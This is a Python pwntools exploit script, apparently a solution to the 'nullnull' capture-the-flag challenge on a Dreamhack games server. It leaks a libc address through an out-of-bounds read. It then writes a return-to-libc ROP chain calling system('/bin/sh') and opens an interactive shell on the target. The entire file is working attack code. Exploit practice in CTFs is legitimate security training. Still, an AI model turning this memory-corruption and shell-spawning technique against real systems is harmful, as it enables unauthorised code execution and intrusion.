#!/usr/bin/env python3

from pwn import *

exe = ELF("./nullnull")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 17412)

    return r

def leak_qword(r, idx):
    r.sendline(b"3")
    r.sendline(str(idx).encode())
    return int(r.recvline()[:-1])

def write_qword(r, idx, value):
    r.sendline(b"2")
    r.sendline(str(idx).encode())
    r.sendline(str(value).encode())

def main():
    while True:
        r = conn()
        r.sendline(b"1")
        r.sendline(b"A" * 80)
        r.recvline()
        try:
            __libc_start_main = leak_qword(r, 37) - 243
            if len(str(__libc_start_main)) == 15:
                libc.address = __libc_start_main - libc.symbols["__libc_start_main"]
                break
        except:
            r.close()
    
    log.success(f"libc base: {hex(libc.address)}")

    system = libc.symbols["system"]
    binsh = next(libc.search(b"/bin/sh\x00"))
    rop = ROP(libc)
    rdi_gadget = rop.find_gadget(["pop rdi", "ret"])[0]
    ret_gadget = rop.find_gadget(["ret"])[0]

    write_qword(r, 3, ret_gadget)
    write_qword(r, 4, rdi_gadget)
    write_qword(r, 5, binsh)
    write_qword(r, 6, system)

    r.sendline(b"0")

    r.interactive()


if __name__ == "__main__":
    main()
